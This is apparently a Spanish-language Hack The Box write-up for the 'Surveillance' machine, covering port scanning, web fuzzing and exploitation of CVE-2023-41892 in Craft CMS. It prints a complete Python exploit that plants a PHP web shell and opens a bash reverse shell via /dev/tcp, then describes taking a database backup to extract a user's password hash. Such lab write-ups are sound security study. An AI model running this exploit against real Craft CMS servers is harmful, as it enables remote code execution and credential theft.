---
title: Surveillance Writeup
author: miguel3023
date: 2023-12-16
categories: [Writeup, HTB]
tags: [Linux, CTF, Medium]
image:
  path: ../../assets/img/commons/Surveillance/Surveillance.png
  width: 300
  height: 300
---

## Reconocimiento

Inicialmente escaneo los puertos abiertos con Nmap, empleando ciertos parámetros para acelerar el escaneo ya que estamos en entornos totalmente controlados.

```bash
❯ nmap -p- -sS --min-rate=5000 --open -v -n -Pn 10.10.11.245 -oG OpenPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-16 13:12 -05
Initiating SYN Stealth Scan at 13:12
Scanning 10.10.11.245 [65535 ports]
Discovered open port 80/tcp on 10.10.11.245
Discovered open port 22/tcp on 10.10.11.245
Completed SYN Stealth Scan at 13:12, 22.92s elapsed (65535 total ports)
Nmap scan report for 10.10.11.245
Host is up (0.082s latency).
Not shown: 49379 closed tcp ports (reset), 16154 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 22.99 seconds
           Raw packets sent: 113878 (5.011MB) | Rcvd: 62549 (2.502MB)
```

Se aprecia el puerto 80 abierto corriendo "http" y el 22 corriendo "ssh". Ya que hay una página a través de dicho puerto, con **whatweb** se veo las tecnologías que se emplean en la Web.

```bash
❯ whatweb http://10.10.11.245
http://10.10.11.245 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.245], RedirectLocation[http://surveillance.htb/], Title[302 Found], nginx[1.18.0]
ERROR Opening: http://surveillance.htb/ - no address for surveillance.htb
```

Veo que hay un dominio de por medio y no carga la Web ya que el dominio hay que añadirlo al fichero **/etc/hosts** junto a la IP para que a nivel de DNS se resuelva dicho dominio a la IP.

```bash
❯ echo "10.10.11.245 surveillance.htb" >> /etc/hosts

❯ catnp /etc/hosts

    # Host addresses
    127.0.0.1  localhost
    127.0.1.1  parrot
    ::1        localhost ip6-localhost ip6-loopback
    ff02::1    ip6-allnodes
    ff02::2    ip6-allrouters
    # Others
    #
    10.10.11.245 surveillance.htb

```

Posteriormente se visualizo la Web para ver qué contiene

![Web]({{ 'assets/img/commons/Surveillance/Web.png' | relative_url }}){: .center-image }
_Visualizando la Web_


Luego con **Nmap** se hago un escaneo a los puertos específicos encontrados previamente, especificando parámetros para ver la versión de los servicios (HTTP y SSH) que están bajo esos puertos


```bash
❯ nmap -sCV -p22,80 10.10.11.245 -oN services
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-16 13:37 -05
Nmap scan report for surveillance.htb (10.10.11.245)
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title:  Surveillance
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.24 seconds
```

Hago un fuzzeo con **wfuzz** a la Web y descubro una ruta **/admin**

```bash
❯ wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://surveillance.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://surveillance.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000015:   200        1 L      0 W        1 Ch        "index"
000000007:   200        475 L    1185 W     16228 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0
                                                        /"
000000001:   200        475 L    1185 W     16228 Ch    "# directory-list-2.3-medium.txt"
000000003:   200        475 L    1185 W     16228 Ch    "# Copyright 2007 James Fisher"
000000039:   301        7 L      12 W       178 Ch      "img"
000000016:   301        7 L      12 W       178 Ch      "images"
000000014:   200        475 L    1185 W     16228 Ch    "http://surveillance.htb/"
000000259:   302        0 L      0 W        0 Ch        "admin"
```

Luego voy a la Web a ver qué contiene esta ruta y me redirige a **/admin/login**. Veo que tiene un gestor de contenidos (CMS) llamado Craft



![Web]({{ 'assets/img/commons/Surveillance/cms.png' | relative_url }}){: .center-image }
_Craft CMS Login_

Luego buscando "Craft CMS vulnerabilities" y en el primer resultado de la búsqueda, veo que está el **CVE-2023-41892** con un **CVSS** crítico


![Web]({{ 'assets/img/commons/Surveillance/cve.png' | relative_url }}){: .center-image }
_Craft CMS CVE_

## Explotación

Luego buscando por el CVE correspondiente encontré un [POC](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce) el cual contiene un script en Python para la explotación de la vulnerabilidad, sin embargo, yo realicé algunas modificaciones.

Pero antes de continuar con el script, voy a explicar la manera de como entendí cómo sucede todo por detrás, porque soy un curioso y la curiosidad mato al ...

Primeramente, dentro del POC hay un [link](https://blog.calif.io/p/craftcms-rce) donde se nos explica la vulnerabilidad un poco más en detalle. Para resumir todo, básicamente lo que se hace por detrás es que se puede crear un **Objeto** gracias a los distintos métodos que hay corriendo. Dentro de esos métodos hay uno el cual es **\yii\rbac\PhpManager::loadFromFile** que lo que hace es cargar datos desde un archivo, el archivo que indicaremos en el script.

Luego tenemos en el código base de **Craft CMS** una clase **\GuzzleHttp\Psr7\FnStream** que lo que hace es destruir el objeto y hace una limpieza en la memoria, esto nos sirve para poder cargar el **phpinfo** al realizar una nueva instancia de dicha clase.

Una vez entendido esto y que podemos crear objetos a nuestro gusto, está la ocurrencia en la extensión **Imagick**, la cual posteriormente será un objeto. En este [link](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) se nos explica cómo funciona todo.

Ahora abusaremos de la extensión **Imagick** de PHP, donde dicha extensión acepta como parámetro **files** y a este parámetro se le podrán pasar rutas de alguna imágen, una url, o incluso wildcards. (Véase [Imagick Constructor](https://www.php.net/manual/es/imagick.construct.php)).

**Imagick** admite el formato MSL, a través y gracias a dicho formato es que lograremos explotar la vulnerabilidad. A través de este formato seremos capaces de leer o mejor dicho, php será capaz de interpretar un archivo MSL en una ruta donde se le indique.

Una vez comprendido esto, lo que haremos será crear el archivo MSL con formato XML ya que así viene el formato MSL y a través del esquema VID de **Imagick** y con wildcards podemos llegar a saber el nombre del archivo el cual se sube en la máquina víctima, ya que el archivo se sube en la ruta temporal por defecto gracias a que generamos un error por HTTP, solamente que dicho archivo tendrá un nombre que inicia por  **php** y lo que le siga de manera aleatoria. A través del esquema VID lo que se conseguirá no es sólo el nombre del archivo sino que también jugando junto a **MSL** podremos hacer que se ejecute el archivo subido. Una vez entendido todo (O espero que así haya sido) podemos ver el scritp.

```python
#!/usr/bin/env python3

from termcolor import colored
import argparse
import requests
import signal
import time
import sys
import re


def leaving(sig, frame):

    print(colored("\n[!] Saliendo...\n"))
    sys.exit(1)

signal.signal(signal.SIGINT, leaving)

proxy = {'http':'http://127.0.0.1:8080'}

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0"}

def get_target():

    parser = argparse.ArgumentParser(description="Exploit for CVE-2023-41892")

    parser.add_argument("-t", "--target", required=True, dest="target", help="exploit.py -t <ip target or domain>")
    parser.add_argument("-l", "--listen", required=True, dest="listen", help="exploit.py -t -i <your attacker ip>")
    parser.add_argument("-p", "--port", required=True, dest="port", help="exploit.py -t -i <your attacker port of listening>")

    args = parser.parse_args()
    return args.target, args.listen, args.port


def get_route_web(): #Obtenemos la ruta donde se almacena la página web


    data = { "action": "conditions/render",
            "testConfigObject":"craft\elements\conditions\ElementCondition",
            "config": r'{"name":"testConfigObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}' }



    r = requests.post(target, headers=headers, data=data, proxies=proxy)


    route_web = r'<tr><td class="e">\$_SERVER\[\'DOCUMENT_ROOT\'\]<\/td><td class="v">([^<]+)<\/td></tr>'

    match = re.search(route_web, r.text, re.DOTALL)

    return match.group(1)


def write_payload(web_route): #Enviamos un archivo en formato MSL cuya estructura será una imágen y en XML, antes de realizar el envío cargamos a través de la extensión Imagick y con formato MSL el /etc/hosts para que la solicitud HTTP falle, lo que hará que el archivo que enviamos se cargue en la ruta /tmp

    print(colored("\n[*] Enviando archivo de imagen...", 'green'))

    data = { "action": "conditions/render",
            "testConfigObject":"craft\elements\conditions\ElementCondition",
            "config": r'{"name":"testConfigObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/etc/hosts"}}}'      }

    image_file = {

        "image": ("pwned.msl", f"""<?xml version="1.0" encoding="UTF8"?>
        <image>
        <read filename="caption:&lt;?php @system(@$_REQUEST['ts']); ?&gt;"/>
        <write filename="info:{web_route}/cpresources/ts.php"/>
        </image>""", "text/plain")
    }

    r = requests.post(target, headers=headers, data=data, files=image_file)


def execute_msl(): #Ejecutamos a través del esquema vid y formato msl para buscar el nombre del archivo mediante wildcards y con la extensión imagick

    print(colored("\n[*] Obteniendo nombre del archivo...\n", 'green'))

    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:' + "/tmp" + r'/php*"}}}'
    }

    r = requests.post(target, headers=headers, data=data)



def get_shell(your_ip, port): #Enviamos la shell hacia el puerto indicado por el usuario

    print(colored(f"[*] Ponte en escucha por el puerto {port}", 'green'))

    time.sleep(2)

    execute_shell = f'bash -c "bash -i >& /dev/tcp/{your_ip}/{port} 0>&1"'

    params = {"ts": execute_shell}

    r = requests.get(target + "/cpresources/ts.php" , headers=headers, params=params)


def main():

    global target
    target, your_ip, port = get_target()
    target = "http://" + target
    web_route = get_route_web()
    write_payload(web_route)
    execute_msl()
    get_shell(your_ip, port)

if __name__=='__main__':

    main()

```

Una vez ejecutado el script, estamos dentro de la máquina. Después de buscar un largo rato por algún archivo interesante en el servidor, encontré **surveillance--2023-10-17-202801--v4.4.14.sql.zip** bajo la ruta **/var/www/html/craft/storage/backups**. Lo que haré será traerme ese archivo comprimido a mi equipo y descomprimirlo.

Ya que es un archivo muy grande al descomprimirlo, lo que haré será grepear por "username" y luego por el usuario que encontré el cual es "Matthew" y veremos la contraseña del usuario cifrada.


![CommandGrep]({{ 'assets/img/commons/Surveillance/database.png' | relative_url }}){: .center-image }
_Grep DataBase File_
